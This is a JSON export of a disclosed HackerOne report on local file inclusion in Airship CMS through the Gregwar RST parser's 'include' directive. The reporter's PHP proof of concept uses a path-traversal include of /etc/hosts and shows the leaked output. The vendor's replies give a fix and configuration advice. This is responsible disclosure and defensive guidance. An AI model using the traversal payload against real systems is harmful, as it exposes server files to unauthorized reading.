{
  "id": 179034,
  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xNzkwMzQ=",
  "url": "https://hackerone.com/reports/179034",
  "title": "[Airship CMS] Local File Inclusion - RST Parser",
  "state": "Closed",
  "substate": "resolved",
  "severity_rating": "high",
  "readable_substate": "Resolved",
  "created_at": "2016-10-30T23:33:43.551Z",
  "submitted_at": "2016-10-30T23:33:43.551Z",
  "is_member_of_team?": false,
  "is_organization_group_member?": false,
  "reporter": {
    "disabled": false,
    "username": "h4ckninja",
    "url": "/h4ckninja",
    "profile_picture_urls": {
      "small": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
    },
    "is_me?": false,
    "cleared": false,
    "verified": false,
    "hackerone_triager": false,
    "hacker_mediation": false
  },
  "team": {
    "id": 8539,
    "url": "https://hackerone.com/paragonie",
    "handle": "paragonie",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/000/008/539/72f76fed45e5220b47ba2f679371ebf9ccb19c70_original./d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98",
      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/008/539/72f76fed45e5220b47ba2f679371ebf9ccb19c70_original./5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
    },
    "permissions": [

    ],
    "submission_state": "paused",
    "default_currency": "usd",
    "awards_miles": false,
    "offers_bounties": true,
    "state": "public_mode",
    "only_cleared_hackers": false,
    "pentest_feature_enabled?": false,
    "profile": {
      "name": "Paragon Initiative Enterprises",
      "twitter_handle": "ParagonIE",
      "website": "https://github.com/paragonie",
      "about": "Cryptography and Application Security Consultants - We Produce Various Open Source Libraries"
    }
  },
  "has_bounty?": false,
  "in_validation?": false,
  "can_view_team": true,
  "can_view_report": true,
  "is_external_bug": false,
  "is_published": false,
  "is_participant": false,
  "has_collaborators": false,
  "submitted_by_team_member": false,
  "stage": 4,
  "public": true,
  "visibility": "full",
  "cve_ids": [

  ],
  "singular_disclosure_disabled": false,
  "disclosed_at": "2016-10-31T13:00:04.983Z",
  "bug_reporter_agreed_on_going_public_at": null,
  "team_member_agreed_on_going_public_at": "2016-10-31T12:59:43.485Z",
  "comments_closed?": false,
  "facebook_team?": false,
  "team_private?": false,
  "vulnerability_information": "Airship uses the very useful RST Parser from Gregwar. However, the parser has the RST directive `include` built-in (why it isn't a separate directive per the spec, I don't know). However, as a result, LFI is possible in Airship.\n\nI realize this isn't directly Paragonie's code, but since Airship uses this library, I wanted to let you know. I found two instances in the Airship codebase and don't appear to take this side effect in to account:\n\nhttps://github.com/paragonie/airship/blob/58f96aa0e5002b60e74456502d9bfc9483d77b3d/src/Cabin/Hull/Landing/CustomPages.php#L186\n\nhttps://github.com/paragonie/airship/blob/58f96aa0e5002b60e74456502d9bfc9483d77b3d/src/lens_functions.php#L714\n\nThe parser has this problem here:\n\nhttps://github.com/Gregwar/RST/blob/master/Parser.php#L762. There doesn't appear to be a way for users of this library to turn it off short of re-implementing their own parser. The spec itself recognizes this security impact: http://docutils.sourceforge.net/docs/ref/rst/directives.html#include.\n\nTo demonstrate:\n\n`rst.php`:\n\n~~~\n<?php\n\nrequire('autoload.php');\n\n\n$parser = new Gregwar\\RST\\Parser;\n\n// RST document\n$document = '*Test*\n\n.. include:: /./../../../../../../../../../../../../../../../../../../etc/hosts\n\n``test``\n';\n\n// Parse it\n$html = $parser->parse($document);\n\n// Render it\necho $html;\n~~~\n\nOutput:\n\n~~~\n$ php rst.php\n<p><em>Test</em></p>\n<p>##\n# Host Database\n#\n# localhost is used to configure the loopback interface\n# when the system is booting.  Do not change this entry.\n##\n127.0.0.1\tlocalhost\n255.255.255.255\tbroadcasthost\n::1             localhost </p>\n\n[...]\n~~~\n\n\n\n",
  "weakness": {
    "id": 18,
    "name": "Information Disclosure"
  },
  "original_report_id": null,
  "original_report_url": null,
  "attachments": [

  ],
  "allow_singular_disclosure_at": "2016-11-30T12:59:43.528Z",
  "allow_singular_disclosure_after": -214946020.8154225,
  "singular_disclosure_allowed": true,
  "vote_count": 7,
  "voters": [
    "static",
    "madrobot",
    "muhammad_uwais",
    "ibram",
    "bastianwelfrid",
    "zacksecurity",
    "spetr0x"
  ],
  "severity": {
    "rating": "high",
    "author_type": "User"
  },
  "structured_scope": null,
  "abilities": {
    "assignable_team_members": [

    ],
    "assignable_team_member_groups": [

    ]
  },
  "activities": [
    {
      "id": 1275282,
      "is_internal": false,
      "editable": false,
      "type": "Activities::Comment",
      "message": "Full acknowledgement.\n\nAlthough this is in a downstream library and not part of our code, this is a valid security concern that needs to be mitigated ASAP.\n\nSome immediate ideas:\n\n1. Fork and disable this directive.\n2. Create a RST snippet directory and only allow files whose realpath resolves to that directory. This will allow users to create their own RST snippets if they *really* want this functionality, but default to the equivalent of being disabled outright.",
      "automated_response": false,
      "created_at": "2016-10-30T23:44:15.009Z",
      "updated_at": "2016-10-30T23:44:15.009Z",
      "actor": {
        "username": "paragonie-scott",
        "cleared": false,
        "verified": false,
        "url": "/paragonie-scott",
        "profile_picture_urls": {
          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/051/441/089de22b2f1b80a1e57a2792318dede5cbad81db_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
        },
        "hackerone_triager": false,
        "hackerone_employee": false
      },
      "genius_execution_id": null,
      "team_handle": "paragonie"
    },
    {
      "id": 1275881,
      "is_internal": false,
      "editable": false,
      "type": "Activities::BugResolved",
      "message": "https://github.com/Gregwar/RST/pull/34 - Contributed the fix upstream, waiting for a new release to be tagged before I tag and release Airship v1.3.2.",
      "automated_response": false,
      "created_at": "2016-10-31T12:08:50.585Z",
      "updated_at": "2016-10-31T12:08:50.585Z",
      "actor": {
        "username": "paragonie-scott",
        "cleared": false,
        "verified": false,
        "url": "/paragonie-scott",
        "profile_picture_urls": {
          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/051/441/089de22b2f1b80a1e57a2792318dede5cbad81db_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
        },
        "hackerone_triager": false,
        "hackerone_employee": false
      },
      "reporter": {
        "username": "h4ckninja",
        "url": "/h4ckninja"
      },
      "genius_execution_id": null,
      "team_handle": "paragonie"
    },
    {
      "id": 1275957,
      "is_internal": false,
      "editable": false,
      "type": "Activities::AgreedOnGoingPublic",
      "message": "",
      "automated_response": false,
      "created_at": "2016-10-31T12:59:43.507Z",
      "updated_at": "2016-10-31T12:59:43.507Z",
      "first_to_agree": true,
      "actor": {
        "username": "paragonie-scott",
        "cleared": false,
        "verified": false,
        "url": "/paragonie-scott",
        "profile_picture_urls": {
          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/051/441/089de22b2f1b80a1e57a2792318dede5cbad81db_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
        },
        "hackerone_triager": false,
        "hackerone_employee": false
      },
      "genius_execution_id": null,
      "team_handle": "paragonie"
    },
    {
      "id": 1275958,
      "is_internal": false,
      "editable": false,
      "type": "Activities::ManuallyDisclosed",
      "message": "Thanks. v1.3.2 is released; disclosing fully.",
      "automated_response": false,
      "created_at": "2016-10-31T13:00:04.960Z",
      "updated_at": "2016-10-31T13:00:04.960Z",
      "actor": {
        "username": "paragonie-scott",
        "cleared": false,
        "verified": false,
        "url": "/paragonie-scott",
        "profile_picture_urls": {
          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/051/441/089de22b2f1b80a1e57a2792318dede5cbad81db_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
        },
        "hackerone_triager": false,
        "hackerone_employee": false
      },
      "genius_execution_id": null,
      "team_handle": "paragonie"
    },
    {
      "id": 1276008,
      "is_internal": false,
      "editable": false,
      "type": "Activities::Comment",
      "message": "To anyone else reading this that uses Gregwar/RST, upgrading to v1.0.3 is not enough. You'll need to do a little bit more:\n\n### Disable File Inclusion\n\n```diff\n- $parser = new Gregwar\\RST\\Parser();\n+ $parser = (new Gregwar\\RST\\Parser())\n+     ->setIncludePolicy(false);\n```\n\n### Jail File Inclusion to a Specific Directory\n\n```diff\n- $parser = new Gregwar\\RST\\Parser();\n+ $parser = (new Gregwar\\RST\\Parser())\n+     ->setIncludePolicy(true, '/path/to/rst/jail');\n```\n\nNote that this supports the same syntax as PHP's open_basedir (joined with a `:` separator)\n\n```diff\n- $parser = new Gregwar\\RST\\Parser();\n+ $parser = (new Gregwar\\RST\\Parser())\n+     ->setIncludePolicy(\n+         true,\n+         implode(':', [\n+             '/var/www/common/rst-snippets',\n+             '/var/www/example.com/rst-snippets'\n+         ])\n+ );\n```\n\n### General Recommendations\n\n* If you're loading RST templates from a database, disable `include`. This is what Airship does.\n* If you're loading RST templates from the filesystem and need `include` for snippets, jail all includes to within a common directory.",
      "automated_response": false,
      "created_at": "2016-10-31T13:30:23.829Z",
      "updated_at": "2016-10-31T13:30:23.829Z",
      "actor": {
        "username": "paragonie-scott",
        "cleared": false,
        "verified": false,
        "url": "/paragonie-scott",
        "profile_picture_urls": {
          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/051/441/089de22b2f1b80a1e57a2792318dede5cbad81db_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
        },
        "hackerone_triager": false,
        "hackerone_employee": false
      },
      "genius_execution_id": null,
      "team_handle": "paragonie"
    },
    {
      "id": 1653840,
      "is_internal": false,
      "editable": false,
      "type": "Activities::NotEligibleForBounty",
      "message": "This was not a vulnerability in our code itself, but the report here allowed us to get a fix in the upstream library.",
      "automated_response": false,
      "created_at": "2017-05-04T14:18:27.632Z",
      "updated_at": "2017-05-04T14:18:27.632Z",
      "actor": {
        "url": "/paragonie",
        "ibb": false,
        "profile_picture_urls": {
          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/008/539/72f76fed45e5220b47ba2f679371ebf9ccb19c70_original./5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
        },
        "profile": {
          "name": "Paragon Initiative Enterprises"
        }
      },
      "genius_execution_id": null,
      "team_handle": "paragonie"
    }
  ],
  "activity_page_count": 1,
  "activity_page_number": 1,
  "summaries": [
    {
      "category": "team",
      "can_view?": true,
      "can_create?": false
    },
    {
      "category": "researcher",
      "can_view?": true,
      "can_create?": false
    }
  ]
}